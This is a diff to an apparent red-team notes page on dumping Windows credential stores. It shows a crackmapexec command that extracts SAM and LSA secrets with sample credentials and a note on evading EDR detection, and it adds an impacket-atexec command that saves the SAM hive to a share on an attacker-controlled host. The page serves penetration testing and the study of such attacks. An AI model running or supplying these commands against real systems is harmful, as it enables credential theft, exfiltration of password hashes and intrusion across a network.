@@ -32,7 +32,7 @@ Connect to the *Remote Registry* service, read the boot key from the `SYSTEM` hi
     crackmapexec smb srv01.corp.local --local-auth -u administrator -p 'passw0rd' --sam --lsa
     ~~~
 
-Dump the registry hives without touching disk.
+Connect to *Remote Registry* and dump the registry hives without touching disk by temporally relaxing ACLs.
 
 === "[[notes/tools/go-secdump]]"
     ~~~ bash
@@ -45,7 +45,13 @@ Dump the registry hives without touching disk.
 >
 > A few EDRs detect remote access to `SAM` even without this indicators.
 > In this case you can try to run any of the Windows builtins remotely instead of relying on the *Remote Registry*.
-> See [[notes/lateral-movement/index]] for possible techniques.
+
+Dump the `SAM` hive trough local registry access to a SMB share.
+
+=== "[[notes/tools/impacket]]"
+    ~~~ bash
+    impacket-atexec -silentcommand administrator:'passw0rd'@srv01.corp.local 'reg.exe save hklm\sam \\attacker.corp.local\share\%COMPUTERNAME%-sam.save'
+    ~~~
 
 # Extract on Linux
 
